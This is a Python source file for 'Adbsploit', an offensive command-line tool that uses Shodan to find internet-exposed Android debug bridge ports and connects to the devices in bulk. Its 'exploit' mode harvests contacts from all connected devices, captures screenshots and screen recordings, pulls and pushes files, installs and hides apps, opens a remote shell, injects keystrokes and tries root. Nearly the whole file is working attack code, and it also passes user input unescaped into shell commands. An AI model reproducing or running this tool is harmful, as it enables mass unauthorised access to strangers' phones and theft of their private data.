# -*- coding: utf-8 -*-
'''
Authors: Iqbalmh18
Project: Adbspooit
Version: 1.0
'''
import os,sys
from datetime import datetime
from rich.console import Console
from rich.table import Table
from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit import prompt
from prompt_toolkit.styles import Style
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.completion import WordCompleter
######################### global ########################
WordAdb = WordCompleter(['?','help', 'update', 'clear', 'exit', 'shodan init ', 'shodan search ', 'connect ', 'tcpip', 'show apikey', 'show devices', 'exploit'])
WordExp = WordCompleter(['?','help','clear','back','app','shell','sysinfo','screencap','screenrec','usekey','pull', 'push', 'root','reboot'])
KeyList = ('UNKOWN','MENU','SOFT_RIGHT','HOME','BACK','ENDCALL','CALL','0','1','2','3','4','5','6','7','8','9','START','POUND','DPAD_UP','DPAD_DOWN','DPAD_LEFT','DPAD_RIGHT','DPAD_CENTER','VOLUME_UP','VOLUME_DOWN','POWER','CAMERA','CLEAR','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','COMMA','PERIOD','ALT_LEFT','ALT_RIGHT','SHIFT_LEFT','SHIFT_RIGHT','TAB','SPACE','SYM','EXPLORER','ENVELOPE','ENTER','DELETE','GRAVE','MINUS','EQUALS','LEFT_BRACKET','RIGHT_BRACKET','BACKSLASH','SEMICOLON','APOSTROPHE','SLASH','AT','NUM','HEADSETHOOK','FOKUS','PLUS','MENU','NOTIFICATION','SEARCH','TAG')

input = PromptSession()

style_main = Style.from_dict({
# USER INPUT (DEFAULT TEXT)
    '':         'white',
# PROMPT STYLE
    'username': 'underline white',
    'pound':    'bold #ce0000',
#    'colon':    '',
#    'host':     '',
#    'path':     '',
})

input_main = [
    ('class:username', 'adbsploit'),
    ('class:pound',    ' > '),
]

style_listener = Style.from_dict({
# USER INPUT (DEFAULT TEXT)
    '':         'white',
# PROMPT STYLE
    'username': 'underline white',
    'pound':    'bold #ce0000',
    'colon1':    'white',
    'colon2':    'white',
    'mode':    'bold cyan',
#    'host':     '',
#    'path':     '',
})

input_listener = [
    ('class:username', 'adbsploit'),
    ('class:colon1', '('),
    ('class:mode', 'connected'),
    ('class:colon2', ')'),
    ('class:pound',    ' > '),
]

w="\033[00m"
r="\033[31;1m"
g="\033[32;1m"
y="\033[33;1m"
b="\033[34;1m"
p="\033[35;1m"
c="\033[36;1m"

ShodanApi = ""
Devices = ""
console = Console()

class Adb():
    def start(self):
        os.system("adb start-server > /dev//null")

    def stop(self):
        os.system("adb kill-server > /dev//null")

    def connect(self,devices):
        global Devices
        Devices = devices
        os.system("adb connect "+devices)

    def connect_all(self,file,debug):
        if os.path.isfile(file) and debug == True:
            files = os.path.basename(file)
            address = open(file,"r")
            sys.stdout.write("\r")
            sys.stdout.write(b+"[*]"+w+" connecting with serialno in: "+files) 
            sys.stdout.flush()
            while True:
                line = address.readline().strip()
                if not line:
                    break
                con = line+" > /dev//null 2>1"
                adb.connect(con)
            address.close()
            os.system("adb devices | sed 's/device/online/g' > logs/cache.log")
            addres = open("logs/cache.log","r")
            nom = 0
            nam = 0
            while True:
                line = addres.readline().strip()
                if not line:
                    break
                if line == "List of onlines attached":
                    del(line)
                elif "online" in line:
                    nom += 1
                    os.system("echo '"+line+"' >> logs/online.log")
                else:
                    nam += 1
                    os.system("echo '"+line+"' >> logs/offline.log")
            num = nom + nam
            addres.close()
            sys.stdout.write(b+"\r[*]"+w+" saved total result ("+c+str(num)+w+") online ("+g+str(nom)+w+") and offline ("+r+str(nam)+w+")\n")
        else:
            address = open(file,"r")
            while True:
                line = address.readline().strip()
                if not line:
                    break
                adb.connect("{} > /dev//null 2>1".format(line))
            address.close()

    def disconnect(self):
        os.system("adb disconnect > /dev//null 2>1")

    def shodan_init(self,api):
        global ShodanApi
        ShodanApi = api
        os.system("echo '"+api+"' > logs/api.log;shodan init "+api)

    def shodan_search(self,limit):
        if (int(limit) < 101):
            sys.stdout.write("\r")
            sys.stdout.write(b+"[*]"+w+" searching query: android debug bridge") 
            sys.stdout.flush()
            os.system("shodan download --limit "+str(limit)+" adb android debug bridge > /dev//null && shodan parse --fields ip_str,port --separator : adb.json.gz > logs/shodan.log")
            if os.path.isfile("logs/shodan.log"):
                f = open("logs/shodan.log","r")
                count = 0
                while True:
                    line = f.readline()
                    if not line:
                        break
                    count += 1
                f.close()
                result_shodan = "shodan_"+datetime.today().strftime('%H%M%S')+".txt"
                os.system("cat logs/shodan.log > result/"+result_shodan)
                sys.stdout.write(b+"\r[*]"+w+" saved ("+str(count)+") result in file: result/"+result_shodan+"\n")
            else:
                sys.stdout.write(b+"\r[*]"+w+" no result found, try again later\n")
        else:
            print("the limit is too big, max limit is 100")

    def tcpip(self,dvc,port):
        if Session != "":
            os.system("adb -s "+dvc+" tcpip "+port)
        else:
            print(r+"[!]"+w+" device not connected")

    def get_contact_all(self):
        table = Table(show_header=True, header_style="green")
        table.add_column("Name", justify="left", width=18)
        table.add_column("Number", justify="center", width=20)
        os.system("python3 init/get_contact.py > logs/raw.log 2>/dev//null")
        if os.path.isfile("logs/raw.log"):
            cek = os.popen("cat logs/raw.log").readline()
            if "No" in cek:
                print(r+"[!]"+w+" no result found")
            else:
                os.system("cat logs/raw.log | grep Row > logs/raw1.log;sed -i -e 's/ //g;s/Row://g;s/display_name=/,/g;s/number=//g;s/*//g;s/#//g;s/+//g;s/-//g;s/.$//g' logs/raw1.log")
                raw1 = open("logs/raw1.log","r")
                while True:
                    line = raw1.readline().strip()
                    if not line:
                        break
                    lines = line.split(",")
                    if len(lines) == 3:
                        table.add_row(
                            lines[1],lines[2]
                            )
                    else:
                        continue
                raw1.close()
                os.system("rm -rf on.log > /dev//null")
                console.print(table)
        else:
            print(r+"[!]"+w+" no online devices found")

    def help(self,num):
        if num == int(0):
            print(w)
            print(w+"<how to use>")
            print(w+" ---------- ")
            print(w+"   shodan init <apikey>      shodan api configuration")
            print(w+"   shodan search <limit>     search for vuln devices")
            print(w+"   show apikey               show shodan api")
            print(w+"   show devices              show available devices")
            print(w+"   connect <option>          connect to devices")
            print(w+"   tcpip <option>            switch from local to tcp")
            print(w+"   exploit <option>          switch to exploit devices")
            print(w)
            print(w+"<basic cmd>")
            print(w+" ---------- ")
            print(w+"   help,?                    show this messages")
            print(w+"   update                    update tools")
            print(w+"   clear                     clear screen")
            print(w+"   exit                      exit in program")
            print(w)
        elif num == int(1):
            print(w)
            print(w+"usage:")
            print(w+"   shodan init <apikey>")
            print(w+"example:")
            print(w+"   shodan init ThisIsmyShodanApikey")
            print(w+"shodan:")
            print(w+"   get shodan api from: https://shodan.io")
            print(w)
        elif num == int(2):
            print(w)
            print(w+"usage:")
            print(w+"   shodan search <limit>    limit for search is 1-100")
            print(w+"example:")
            print(w+"   shodan search 25         then u will received 25 results")
            print(w)
        elif num == int(5):
            print(w)
            print(w+"usage:")
            print(w+"   connect <option>")
            print(w+"option:")
            print(w+"   -s/--serialno     connect with serialno")
            print(w+"   -f/--fromfile     connect from file/list serialno")
            print(w+"example:")
            print(w+"   connect -s 127.0.0.1:5666")
            print(w+"   connect -f /path/to/serialno.list")
            print(w)
        elif num == int(6):
            print(w)
            print(w+"usage:")
            print(w+"   exploit <option>")
            print(w+"option:")
            print(w+"   -s/--serialno     exploit devices by serialno")
            print(w+"   -a/--all          exploit all devices")
            print(w+"exploit name:")
            print(w+"   get_contact       get contact from all devices")
            print(w+"example:")
            print(w+"   exploit -s 127.0.0.1:5666")
            print(w+"   exploit -a <exploit name>")
            print(w)
        elif num == int(7):
            print(w)
            print(w+"usage:")
            print(w+"   tcpip <option> serialno <option> port")
            print(w+"option:")
            print(w+"   -e/--emulator     selecting devices")
            print(w+"   -p/--port         setting port conenction")
            print(w+"example:")
            print(w+"   tcpip --emulator 127.0.0.1 -p 5666")
            print(w+"   tcpip -e 127.0.0.1 --port 5555")
        else:
            pass

SerialNumber = ""
Session = ""

class Exploit():
    def devices(self,serialno):
        global SerialNumber
        SerialNumber = serialno
        os.system("adb connect "+SerialNumber)

    def session(self):
        global Session
        os.system("adb devices | sed 's/device/online/g' > logs/session.log")
        if SerialNumber in open("logs/session.log").read():
            Session = SerialNumber
        else:
            os.system("rm -rf logs/session.log")
            print("Failed to connect with "+SerialNumber)
            
    def shell(self):
        if Session != "":
            os.system("adb -s "+SerialNumber+" shell")
        else:
            print(r+"[!]"+w+" connection problem on: "+SerialNumber)

    def sys_info(self):
        if Session != "":
            DevManufactur = os.popen("adb -s "+SerialNumber+" shell getprop | grep ro.product.manufacturer").readline().strip()
            for rep in (("[", ""), ("ro.product.manufacturer", ""),(":",""),("]",""),(" ","")):
                DevManufactur = DevManufactur.replace(*rep)
                pass
            DevModel = os.popen("adb -s "+SerialNumber+" shell getprop | grep ro.product.model").readline().strip()
            for rep in (("[", ""), ("ro.product.model", ""),(":",""),("]",""),(" ","")):
                DevModel = DevModel.replace(*rep)
                pass
            DevVersion = os.popen("adb -s "+SerialNumber+" shell getprop | grep ro.build.version.release").readline().strip()
            for rep in (("[", ""), ("ro.build.version.release", ""),(":",""),("]",""),(" ","")):
                DevVersion = DevVersion.replace(*rep)
                pass
            DevTimezone = os.popen("adb -s "+SerialNumber+" shell getprop | grep persist.sys.timezone").readline().strip()
            for rep in (("[", ""), ("persist.sys.timezone", ""),(":",""),("]",""),(" ","")):
                DevTimezone = DevTimezone.replace(*rep)
                pass
            print("Devices manufacturer: "+DevManufactur)
            print("Devices model       : "+DevModel)
            print("Android version     : "+DevVersion)
            print("Timezone            : "+DevTimezone)
        else:
            print(r+"[!]"+w+" connection problem on: "+SerialNumber)

    def screencap(self):
        if Session != "":
            DevManufactur = os.popen("adb -s "+SerialNumber+" shell getprop | grep ro.product.manufacturer").readline().strip()
            for rep in (("[", ""), ("ro.product.manufacturer", ""),(":",""),("]",""),(" ","")):
                DevManufactur = DevManufactur.replace(*rep)
                pass
            jpg = DevManufactur+"_"+datetime.today().strftime('%d.%m.%Y')+".jpg"
            sys.stdout.write("\r")
            sys.stdout.write(b+"[*]"+w+" trying to take screenshot from devices") 
            sys.stdout.flush()
            os.system("adb -s "+SerialNumber+" shell screencap -p /sdcard/"+jpg+";sleep 5")
            os.system("adb -s "+SerialNumber+" pull /sdcard/"+jpg+" result/ > /dev//null;adb -s "+SerialNumber+" shell rm /sdcard/"+jpg)
            if os.path.isfile("result/"+jpg):
                sys.stdout.write(b+"\r[*]"+w+" screenshot saved as: "+jpg+"\n")
            else:
                sys.stdout.write(r+"\r[!]"+w+" failed to take screenshot\n")
        else:
            print(r+"[!]"+w+" connection problem on: "+SerialNumber)

    def screenrec(self):
        if Session != "":
            DevManufactur = os.popen("adb -s "+SerialNumber+" shell getprop | grep ro.product.manufacturer").readline().strip()
            for rep in (("[", ""), ("ro.product.manufacturer", ""),(":",""),("]",""),(" ","")):
                DevManufactur = DevManufactur.replace(*rep)
                pass
            mp4 = DevManufactur+"_"+datetime.today().strftime('%d.%m.%Y')+".mp4"
            sys.stdout.write("\r")
            sys.stdout.write(b+"[*]"+w+" recording is started, press ("+y+"ctrl+c"+w+") to stop") 
            sys.stdout.flush()
            os.system("adb -s "+SerialNumber+" shell screenrecord /sdcard/"+mp4+";sleep 3")
            os.system("adb -s "+SerialNumber+" pull /sdcard/"+mp4+" result/ > /dev//null && adb -s "+SerialNumber+" shell rm /sdcard/"+mp4)
            if os.path.isfile("result/"+mp4):
                sys.stdout.write(b+"\r[*]"+w+" screenrecord saved as: "+mp4+"\n")
            else:
                sys.stdout.write(r+"\r[!]"+w+" failed to record screen\n")
        else:
            print(r+"[!]"+w+" connection problem on: "+SerialNumber)

    def download(self,pull,path,out):
        if Session != "" and pull == "dir" and os.path.isdir(out):
            sys.stdout.write("\r")
            sys.stdout.write(b+"[*]"+w+" downloading directory: "+path) 
            sys.stdout.flush()
            os.system("adb -s "+SerialNumber+" pull "+path+" "+out+" > /dev//null 2>1")
            outs = out+"/"+os.path.basename(path)
            if os.path.isdir(outs):
                sys.stdout.write(b+"\r[*]"+w+" download successfully saved as: "+outs+"\n") 
            else:
                sys.stdout.write(b+"\r[*]"+w+" failed to download directory\n") 
        elif Session != "" and pull == "file" and os.path.isdir(out):
            sys.stdout.write("\r")
            sys.stdout.write(b+"[*]"+w+" downloading file: "+path) 
            sys.stdout.flush()
            os.system("adb -s "+SerialNumber+" pull "+path+" "+out+" > /dev//null 2>1")
            outs = out+"/"+os.path.basename(path)
            if os.path.isfile(outs):
                sys.stdout.write(b+"\r[*]"+w+" download successfully saved as: "+outs+"\n") 
            else:
                sys.stdout.write(b+"\r[*]"+w+" failed to download file\n") 
        else:
            print(r+"[!]"+w+" connection problem on: "+SerialNumber)

    def upload(self,push):
        if Session != "":
            if os.path.isfile(push):
                sys.stdout.write("\r")
                sys.stdout.write(b+"[*]"+w+" uploading file: "+push) 
                sys.stdout.flush()
                os.system("adb -s "+SerialNumber+" push "+push+" /sdcard > /dev//null 2>1")
                sys.stdout.write(b+"\r[*]"+w+" file uploaded saved as: /sdcard/"+os.path.basename(push)+"\n") 
            elif os.path.isdir(push):
                sys.stdout.write("\r")
                sys.stdout.write(b+"[*]"+w+" uploading directory: "+push) 
                sys.stdout.flush()
                os.system("adb -s "+SerialNumber+" push "+push+" /sdcard > /dev//null 2>1")
                sys.stdout.write(b+"\r[*]"+w+" directory uploaded saved as: /sdcard/"+os.path.basename(push)+"\n") 
            else:
                print(r+"[!]"+w+" file or directory not found")
        else:
            print(r+"[!]"+w+" connection problem on: "+SerialNumber)

    def app_install(self,method,apk):
        fileapk = os.path.basename(apk)
        if Session!= "" and method == "install" and os.path.isfile(apk):
            status = []
            appname = os.popen('''aapt dump badging '''+apk+''' | awk '/package/{gsub("name=|'"'"'","");'''+"""  print $2}'""").readline().strip()
            if appname != "":
                pass
            os.system("adb -s "+SerialNumber+" install "+apk+" > /dev/null")
            os.system("adb -s"+SerialNumber+" shell pm list package > logs/cache.log")
            f = open("logs/cache.log")
            apn = "package:"+appname
            while True:
                line = f.readline().strip()
                if not line:
                    break
                if apn in line:
                   status = True
                else:
                    continue
            f.close()
            if status == True:
                print(b+"[*]"+w+" successfully installing: "+appname+" ("+fileapk+")")
            else:
                print(r+"[!]"+w+" failed to installing: "+appname+" ("+fileapk+")")
        else:
            exploit.help(1)

    def app_uninstall(self,appn):
        if Session != "" and appn != "":
            status = []
            os.system("adb -s "+SerialNumber+" uninstall "+appn+" > /dev//null")
            os.system("adb -s "+SerialNumber+" > logs/cache.log")
            f = open("logs/cache.log")
            while True:
                line = f.readline().strip()
                if not line:
                    break
                if appn in line:
                    continue
                else:
                    status = True
            f.close()
            if status == True:
                print(b+"[*]"+w+" successfully uninstalling: "+appn)
            else:
                print(r+"[!]"+w+" failed to uninstalling: "+appn)
        else:
            exploit.help(1)

    def app_run(self,appa):
        if Session != "" and appa != "":
            cek = os.popen("adb -s "+SerialNumber+" shell pm list package | grep "+appa).readline().strip()
            appname = "package:"+appa
            if appname in cek:
                activity = os.popen("adb -s "+SerialNumber+" shell 'cmd package resolve-activity --brief "+appa+" | tail -n 1'").readline().strip()
                os.system("adb -s "+SerialNumber+" shell am start -n "+activity+" > /dev//null")
                print(b+"[*]"+w+" starting activity: "+activity)
            else:
                print(r+"[!]"+w+" package is not installed")
        else:
            print(r+"[!]"+w+" connection problem on: "+SerialNumber)

    def app_path(self,appath):
        if Session != "":
            path = os.popen("adb -s "+SerialNumber+" shell pm path "+appath).readline().strip()
            print(b+"[*]"+w+" pacakge file: "+appath)
        else:
            print(r+"[!]"+w+" connection problem on: "+SerialNumber)

    def app_list(self):
        if Session != "":
            os.system("adb -s "+SerialNumber+" shell pm list package | sed 's/package://g'")
        else:
            print(r+"[!]"+w+" connection problem on: "+SerialNumber)

    def app_hide(self,hide):
        if Session != "":
            os.system("adb -s "+SerialNumber+" shell pm hide "+hide+" > /dev//null")
            print(b+"[*]"+w+" hide apps: "+hide)
        else:
            print(r+"[!]"+w+" connection problem on: "+SerialNumber)

    def app_unhide(self,unhide):
        if Session != "":
            os.system("adb -s "+SerialNumber+" shell pm unhide "+unhide+" > /dev//null")
            print(b+"[*]"+w+" unhide apps: "+unhide)
        else:
            print(r+"[!]"+w+" connection problem on: "+SerialNumber)

    def key(self,no):
        if Session != "":
            os.system("adb -s "+SerialNumber+" shell input keyevent "+str(no)+" > /dev//null")
            print(b+"[*]"+w+" executing remote code for: "+KeyList[no])
        else:
            print(r+"[!]"+w+" connection problem on: "+SerialNumber)

    def keyinput(self,text):
        if Session != "":
            os.system("adb -s "+SerialNumber+" shell input text '"+text+"' > /dev//null 2>1")

    def logcat(self):
        if Session != "":
            os.system("adb -s "+SerialNumber+" logcat")
        else:
            print(r+"[!]"+w+" connection problem on: "+SerialNumber)

    def root(self):
        if Session != "":
            rot = os.popen("adb -s "+SerialNumber+" root").read()
            if "adbd is already running as root" in rot:
                print(g+"[*]"+w+" devices already running as root")
            else:
                print(r+"[!]"+w+" failed to running as root")
        else:
            print(r+"[!]"+w+" connection problem on: "+SerialNumber)

    def reboot(self,no):
        if Session != "":
            if no == int(1):
                os.system("adb -s "+SerialNumber+" shell reboot recovery > /dev//null")
                print(b+"[*]"+w+" devices rebooted into: recovery")
            elif no == int(2):
                os.system("adb -s "+SerialNumber+" shell reboot bootloader > /dev//null")
                print(b+"[*]"+w+" devices rebooted into: bootloader")
            else:
                exploit.help(4)
        else:
            print(r+"[!]"+w+" connection problem on: "+SerialNumber)

    def help(self,num):
        if num == int(0):
            print(w)
            print(w+"<list exploit>")
            print(w+" ------------ ")
            print(w+"   app                  app manager")
            print(w+"   shell                switch to command shell")
            print(w+"   sysinfo              system information")
            print(w+"   screencap            screenshot device")
            print(w+"   screenrec            screenrecord device")
            print(w+"   usekey               remote device with key")
            print(w+"   pull                 download file/directory")
            print(w+"   push                 upload file/directory")
            print(w+"   logcat               displaying logcat")
            print(w+"   root                 run device as root")
            print(w+"   reboot               reboot manager")
            print(w)
            print(w+"<basic cmd>")
            print(w+" ------------ ")
            print(w+"   help,?               show this messages")
            print(w+"   clear                clear screen")
            print(w+"   exit                 exit from listener")
            print(w)
        elif num == int(1):
            print(w)
            print(w+"<usage>")
            print(w+"   app <option> <foo>")
            print(w+"<option>")
            print(w+"   -i/--install     install apk from computer")
            print(w+"   -u/--uninstall   uninstall apk with packagename")
            print(w+"   -r/--run         run app with launch activity")
            print(w+"   -p/--path        get path to apk file ")
            print(w+"   --hide           hide application")
            print(w+"   --unhide         unhide application")
            print(w+"<example>")
            print(w+"   app --install /sdcard/foo.apk")
            print(w+"   app -u com.packagename.example")
            print(w+"   app -r com.packagename.example")
            print(w)
        elif num == int(2):
            print(w)
            print(w+"<usage>")
            print(w+"   usekey <option> <foo>")
            print(w+"<option>")
            print(w+"   -l/--list      show key code list")
            print(w+"   -e/--exec      exec key code")
            print(w+"<example>")
            print(w+"   usekey --list")
            print(w+"   usekey -e 18")
            print(w)
        elif num == int(3):
            print(w)
            print(w+"<usage>")
            print(w+"   pull <option> <foo>")
            print(w+"<option>")
            print(w+"   -f/--file        download file from device")
            print(w+"   -d/--dir         download directory from device")
            print(w+"   -o/--output      output to local storage")
            print(w+"<example>")
            print(w+"   pull -f /sdcard/foo.jpg --output /sdcard")
            print(w+"   pull -d /sdcard/documents/ -o ~/Desktop/")
            print(w)
        elif num == int(4):
            print(w)
            print(w+"<usage>")
            print(w+"   reboot <option>")
            print(w+"<option>")
            print(w+"   -r/--recovery      reboot to recovery")
            print(w+"   -b/--bootloader    reboot to bootloader")
            print(w)
        elif num == int(5):
            print(w)
            print(w+"<usage>")
            print(w+"   logcat <option>")
            print(w+"<option>")
            print(w+"   --start            starting logcat")
            print(w)
        elif num == int(6):
            print(w)
            print(w+"<usage>")
            print(w+"   push <option> <foo>")
            print(w+"<option>")
            print(w+"   -f/--file        upload file")
            print(w+"   -d/--dir         upload directory")
            print(w+"<example>")
            print(w+"   push -f /sdcard/foo.jpg")
            print(w+"   push -d /sdcard/documents/")
            print(w)
        else:
            pass

adb = Adb()
exploit = Exploit()

logo = """
"""+r+"""   ▄████████ ████████▄  ▀█████████▄  """+w+"""
"""+r+"""  ███    ███ ███   ▀███   ███    ███ """+r+""" A D B S P L O I T
"""+r+"""  ███    ███ ███    ███   ███    ███"""+"\033[30;1m "+""" -----------------
"""+r+"""  ███    ███ ███    ███  ▄███▄▄▄██▀  """+w+""" version-release: 1.0
"""+r+"""▀███████████ ███    ███ ▀▀███▀▀▀██▄  """+w+""" coded by """+c+"""@iqbalmh18
"""+r+"""  ███    ███ ███    ███   ███    ██▄ """+w+"""
"""+r+"""  ███    ███ ███   ▄███   ███    ███ """+w+""" \033[041m   \033[42m   \033[43m   \033[44m   \033[45m   \033[47m   \033[40m   \033[00m
"""+r+"""  ███    █▀  ████████▀  ▄█████████▀  """+w+"""
"""